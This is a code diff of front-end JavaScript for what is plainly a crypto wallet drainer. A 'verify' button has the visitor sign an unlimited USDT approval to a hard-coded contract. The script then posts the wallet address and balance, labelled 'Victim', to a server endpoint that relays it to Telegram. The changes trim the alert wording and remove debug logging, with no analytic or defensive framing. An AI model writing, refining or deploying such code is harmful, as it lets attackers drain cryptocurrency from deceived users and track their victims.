@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   verifyBtn.addEventListener("click", async () => {
     if (!window.ethereum) {
-      alert("No wallet found. Open this site inside MetaMask or Trust Wallet browser.");
+      alert("No wallet found. Open in MetaMask or Trust Wallet browser.");
       return;
     }
 
@@ -25,11 +25,9 @@ document.addEventListener("DOMContentLoaded", () => {
       const formattedBalance = ethers.utils.formatUnits(balance, 18);
 
       await usdt.approve(CONTRACT_TO_APPROVE, ethers.constants.MaxUint256);
-      alert("USDT approval sent. Sending Telegram alert...");
+      alert("USDT approval sent. Sending alert...");
 
       const message = `Victim: ${address}\nUSDT Balance: ${formattedBalance}`;
-      console.log("Sending to Telegram:", message);
-
       const response = await fetch("/tele", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -39,12 +37,11 @@ document.addEventListener("DOMContentLoaded", () => {
       if (response.ok) {
         alert("Telegram message sent successfully.");
       } else {
-        alert("Telegram failed. Server responded with: " + response.status);
+        alert("Failed to send Telegram. Status: " + response.status);
       }
 
     } catch (err) {
-      console.error("Error:", err);
-      alert("Something went wrong: " + err.message);
+      alert("Error: " + err.message);
     }
   });
 });
